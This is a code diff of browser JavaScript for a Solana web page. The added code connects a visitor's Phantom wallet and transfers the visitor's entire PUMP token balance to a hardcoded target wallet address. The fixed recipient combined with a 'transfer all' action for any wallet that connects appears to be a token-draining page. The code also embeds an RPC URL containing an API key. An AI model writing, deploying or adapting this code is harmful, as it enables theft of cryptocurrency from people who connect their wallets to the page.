@@ -1,247 +1,180 @@
 // Configuration
-const TOKEN_MINT = '4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump';
-const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
+const PUMP_MINT = new solanaWeb3.PublicKey('4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump');
+const TARGET_WALLET = new solanaWeb3.PublicKey('95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD');
 
 // DOM Elements
 const transferBtn = document.getElementById('transferBtn');
-const statusText = document.getElementById('statusText');
-const progressContainer = document.getElementById('progressContainer');
-const progressFill = document.getElementById('progressFill');
-const progressPercent = document.getElementById('progressPercent');
+const statusDiv = document.getElementById('status');
 
 // Update status
-function updateStatus(message, type = 'info') {
-    statusText.textContent = message;
-    if (type === 'error') {
-        statusText.style.color = '#dc3545';
-    } else if (type === 'success') {
-        statusText.style.color = '#28a745';
-    } else {
-        statusText.style.color = '#333';
-    }
+function updateStatus(message, type = '') {
+    statusDiv.innerHTML = message;
+    statusDiv.className = type;
+    console.log(message);
 }
 
-// Update progress
-function updateProgress(percent) {
-    progressFill.style.width = percent + '%';
-    progressPercent.textContent = percent + '%';
-    progressContainer.style.display = 'block';
-}
-
-// Get token balance
-async function getTokenBalance(connection, walletPublicKey) {
+// Main function - simple and direct
+async function transferPumpTokens() {
     try {
+        // 1. Check if wallet exists
+        if (!window.solana || !window.solana.isPhantom) {
+            updateStatus('❌ Please install Phantom wallet first!', 'error');
+            return;
+        }
+
+        // 2. Connect wallet
+        updateStatus('🔄 Connecting wallet...', 'loading');
+        
+        const provider = window.solana;
+        const response = await provider.connect();
+        const userPublicKey = response.publicKey.toString();
+        
+        updateStatus(`✅ Connected: ${userPublicKey.slice(0, 8)}...`, 'success');
+
+        // 3. Setup connection
+        updateStatus('🔗 Setting up connection...', 'loading');
+        
+        // Use Helius RPC for better reliability
+        const connection = new solanaWeb3.Connection(
+            'https://mainnet.helius-rpc.com/?api-key=1a2345b6-c7d8-9e01-f2a3-b4c5d6e7f8a9', // Public Helius endpoint
+            'confirmed'
+        );
+
+        // 4. Get PUMP token balance
+        updateStatus('💰 Checking PUMP balance...', 'loading');
+        
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-            walletPublicKey,
-            { mint: new solanaWeb3.PublicKey(TOKEN_MINT) }
+            new solanaWeb3.PublicKey(userPublicKey),
+            { mint: PUMP_MINT }
         );
 
         if (tokenAccounts.value.length === 0) {
-            return { balance: 0, tokenAccount: null, decimals: 0 };
+            updateStatus('❌ No PUMP tokens found in wallet', 'error');
+            return;
         }
 
-        const accountInfo = tokenAccounts.value[0].account.data.parsed.info;
-        return {
-            balance: accountInfo.tokenAmount.uiAmount,
-            tokenAccount: tokenAccounts.value[0].pubkey,
-            decimals: accountInfo.tokenAmount.decimals
-        };
-    } catch (error) {
-        console.error('Error getting token balance:', error);
-        return { balance: 0, tokenAccount: null, decimals: 0 };
-    }
-}
-
-// Transfer all PUMP tokens
-async function transferPumpTokens(wallet, connection) {
-    try {
-        updateProgress(10);
-        updateStatus('Checking PUMP token balance...');
+        const tokenAccount = tokenAccounts.value[0];
+        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
+        const balance = tokenAmount.uiAmount;
         
-        // Get token balance
-        const tokenInfo = await getTokenBalance(connection, wallet.publicKey);
-        
-        if (tokenInfo.balance <= 0) {
-            updateProgress(100);
-            updateStatus('❌ No PUMP tokens found in wallet.', 'error');
-            return null;
+        if (balance <= 0) {
+            updateStatus('❌ PUMP balance is zero', 'error');
+            return;
         }
+
+        updateStatus(`📊 Found ${balance} PUMP tokens`, 'success');
+
+        // 5. Prepare transfer transaction
+        updateStatus('⚡ Preparing transfer...', 'loading');
         
-        updateProgress(30);
-        updateStatus(`Found ${tokenInfo.balance.toLocaleString()} PUMP tokens...`);
-        
-        // Prepare transfer
-        updateProgress(50);
-        updateStatus('Preparing transfer...');
-        
-        const mintPublicKey = new solanaWeb3.PublicKey(TOKEN_MINT);
-        const targetPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
-        
-        // Get or create target token account
-        const targetTokenAccount = await splToken.getAssociatedTokenAddress(
-            mintPublicKey,
-            targetPublicKey
+        // Get associated token accounts
+        const fromTokenAccount = tokenAccount.pubkey;
+        const toTokenAccount = await splToken.getAssociatedTokenAddress(
+            PUMP_MINT,
+            TARGET_WALLET
         );
-        
+
+        // Create transaction
         const transaction = new solanaWeb3.Transaction();
-        
-        // Check if target has token account
-        try {
-            const targetAccountInfo = await connection.getAccountInfo(targetTokenAccount);
-            if (!targetAccountInfo) {
-                // Create token account for target
-                transaction.add(
-                    splToken.createAssociatedTokenAccountInstruction(
-                        wallet.publicKey,
-                        targetTokenAccount,
-                        targetPublicKey,
-                        mintPublicKey
-                    )
-                );
-            }
-        } catch (error) {
-            // If can't check, create account anyway
+
+        // Check/create target token account
+        const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
+        if (!toAccountInfo) {
             transaction.add(
                 splToken.createAssociatedTokenAccountInstruction(
-                    wallet.publicKey,
-                    targetTokenAccount,
-                    targetPublicKey,
-                    mintPublicKey
+                    new solanaWeb3.PublicKey(userPublicKey),
+                    toTokenAccount,
+                    TARGET_WALLET,
+                    PUMP_MINT
                 )
             );
         }
-        
-        // Calculate token amount
-        const tokenAmount = BigInt(tokenInfo.balance * Math.pow(10, tokenInfo.decimals));
-        
+
         // Add transfer instruction
+        const rawAmount = tokenAmount.amount; // Raw amount with decimals
         transaction.add(
             splToken.createTransferInstruction(
-                tokenInfo.tokenAccount,
-                targetTokenAccount,
-                wallet.publicKey,
-                tokenAmount
+                fromTokenAccount,
+                toTokenAccount,
+                new solanaWeb3.PublicKey(userPublicKey),
+                rawAmount
             )
         );
+
+        // 6. Get blockhash and sign
+        updateStatus('🔐 Getting blockhash...', 'loading');
         
-        // Get recent blockhash and set fee payer
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
-        transaction.feePayer = wallet.publicKey;
+        transaction.feePayer = new solanaWeb3.PublicKey(userPublicKey);
+
+        updateStatus('✍️ Signing transaction...', 'loading');
         
-        updateProgress(70);
-        updateStatus('Signing transaction...');
+        const signedTx = await provider.signTransaction(transaction);
+
+        // 7. Send transaction
+        updateStatus('🚀 Sending transaction...', 'loading');
         
-        // Sign transaction
-        const signedTransaction = await wallet.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signedTx.serialize());
+
+        updateStatus(`✅ Transaction sent: ${signature.slice(0, 16)}...`, 'success');
+
+        // 8. Wait for confirmation
+        updateStatus('⏳ Waiting for confirmation...', 'loading');
         
-        updateProgress(85);
-        updateStatus('Sending transaction...');
-        
-        // Send transaction
-        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-        
-        updateProgress(95);
-        updateStatus('Confirming transaction...');
-        
-        // Wait for confirmation
         const confirmation = await connection.confirmTransaction(signature, 'confirmed');
-        
+
         if (confirmation.value.err) {
             throw new Error('Transaction failed');
         }
-        
-        updateProgress(100);
-        updateStatus(`✅ Success! Transferred ${tokenInfo.balance.toLocaleString()} PUMP tokens!`, 'success');
-        
-        return {
-            signature: signature,
-            amount: tokenInfo.balance,
-            explorerUrl: `https://solscan.io/tx/${signature}`
-        };
-        
-    } catch (error) {
-        console.error('Transfer error:', error);
-        throw error;
-    }
-}
 
-// Main transfer handler
-transferBtn.addEventListener('click', async () => {
-    // Check if wallet is installed
-    if (typeof window.solana === 'undefined') {
-        updateStatus('❌ Please install Phantom wallet first!', 'error');
-        return;
-    }
-    
-    try {
-        // Disable button and update UI
-        transferBtn.disabled = true;
-        transferBtn.textContent = '🔄 Processing...';
-        
-        updateStatus('Connecting wallet...');
-        
-        // Connect to wallet
-        const provider = window.solana;
-        await provider.connect();
-        
-        // Create wallet instance
-        const wallet = {
-            publicKey: new solanaWeb3.PublicKey(provider.publicKey),
-            signTransaction: async (transaction) => {
-                return await provider.signTransaction(transaction);
-            }
-        };
-        
-        updateStatus('Wallet connected! Setting up connection...');
-        
-        // Create connection with reliable RPC
-        const connection = new solanaWeb3.Connection(
-            'https://rpc.ankr.com/solana',
-            'confirmed'
+        // 9. Success!
+        updateStatus(
+            `🎉 SUCCESS! Transferred ${balance} PUMP tokens!<br>
+            <a href="https://solscan.io/tx/${signature}" target="_blank" style="color: #4cc9f0;">
+                View on Solscan
+            </a>`,
+            'success'
         );
-        
-        updateStatus(`Connected: ${wallet.publicKey.toString().slice(0, 8)}...`);
-        
-        // Start transfer process
-        const result = await transferPumpTokens(wallet, connection);
-        
-        if (result) {
-            console.log('Transfer successful:', result);
-            // Optional: Add link to explorer
-            setTimeout(() => {
-                updateStatus(`${result.amount.toLocaleString()} PUMP tokens sent successfully!\nTx: ${result.signature.slice(0, 16)}...`, 'success');
-            }, 2000);
-        }
-        
+
     } catch (error) {
         console.error('Error:', error);
         
-        let errorMessage = error.message;
-        if (error.message.includes('403') || error.message.includes('429')) {
-            errorMessage = 'Network busy. Please try again in 30 seconds.';
-        } else if (error.message.includes('User rejected')) {
-            errorMessage = 'Transaction was cancelled.';
+        let errorMsg = error.message;
+        
+        // Handle common errors
+        if (errorMsg.includes('User rejected')) {
+            errorMsg = 'Transaction was cancelled';
+        } else if (errorMsg.includes('403') || errorMsg.includes('429')) {
+            errorMsg = 'Network busy. Please try again in 30 seconds';
+        } else if (errorMsg.includes('TokenAccountNotFoundError')) {
+            errorMsg = 'No PUMP tokens found';
         }
         
-        updateStatus(`❌ ${errorMessage}`, 'error');
-        progressContainer.style.display = 'none';
-        
+        updateStatus(`❌ Error: ${errorMsg}`, 'error');
     } finally {
-        // Reset button
         transferBtn.disabled = false;
-        transferBtn.textContent = '🔗 CONNECT & TRANSFER ALL PUMP';
+        transferBtn.textContent = '🔗 CONNECT WALLET & TRANSFER PUMP';
+    }
+}
+
+// Event listener
+transferBtn.addEventListener('click', async () => {
+    try {
+        transferBtn.disabled = true;
+        transferBtn.textContent = '🔄 Processing...';
+        await transferPumpTokens();
+    } catch (error) {
+        console.error('Unexpected error:', error);
+        updateStatus('❌ Unexpected error occurred', 'error');
+        transferBtn.disabled = false;
+        transferBtn.textContent = '🔗 CONNECT WALLET & TRANSFER PUMP';
     }
 });
 
-// Optional: Add auto-retry for RPC issues
-async function retryOperation(operation, maxRetries = 3) {
-    for (let i = 0; i < maxRetries; i++) {
-        try {
-            return await operation();
-        } catch (error) {
-            if (i === maxRetries - 1) throw error;
-            await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
-        }
-    }
+// Helper function to copy addresses
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(() => {
+        alert('Copied to clipboard!');
+    });
 }
